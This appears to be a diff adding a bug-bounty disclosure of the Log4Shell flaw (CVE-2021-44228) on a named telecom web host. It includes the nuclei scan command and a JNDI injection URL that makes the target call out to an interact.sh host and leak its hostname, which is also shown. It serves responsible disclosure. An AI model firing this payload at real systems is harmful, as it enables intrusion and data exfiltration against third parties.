@@ -151,4 +151,40 @@ Upgrade Log4j to latest version, 2.1.17.
 ## Impact
 
 Remote OS command injection via JNDI queries.
+___________________________________
+###Summary
+Hello,
+
+I would to like report this security flaw on http://mtn1app.mtncameroon.net . Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
+
+###Steps To Reproduce
+How we can reproduce the issue;
+
+1. run nuclei script via cmd; ./nuclei -u http://mtn1app.mtncameroon.net:8080/ -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml
+
+It will retrive the hostname of machine on output " lastic-co1-nodes1.mtnnigeria.net"
+
+Like this;
+
+````
+http://mtn1app.mtncameroon.net:8080/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbnjyyyybjg.interact.sh/a} [lastic-co1-nodes1.mtnnigeria.net]
+````
+
+This vulnerability is on port 8080 and 8443;
+
+* http://mtn1app.mtncameroon.net:8080
+* https://mtn1app.mtncameroon.net:8443
+
+
+
+###Mitigation
+Update according the vendor and thecnical references..
+
+###References
+https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability
+https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
+
+## Impact
+
+Remote command execution
 
